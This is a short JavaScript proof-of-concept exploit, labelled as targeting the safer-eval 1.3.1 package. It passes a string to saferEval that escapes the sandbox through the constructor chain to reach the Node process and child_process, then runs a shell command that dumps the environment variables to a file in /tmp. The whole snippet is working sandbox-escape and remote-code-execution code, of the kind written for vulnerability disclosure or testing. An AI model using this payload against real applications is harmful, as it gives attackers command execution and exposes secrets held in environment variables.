// this exploit targets safer-eval@1.3.1
try {
  const code = `console.constructor.constructor('return process')().mainModule.require('child_process').execSync('env > /tmp/rce')`;
  const res = saferEval(code);
  console.log(res.toString("utf8"));
} catch (error) {
  console.log(`attempt failed`);
}
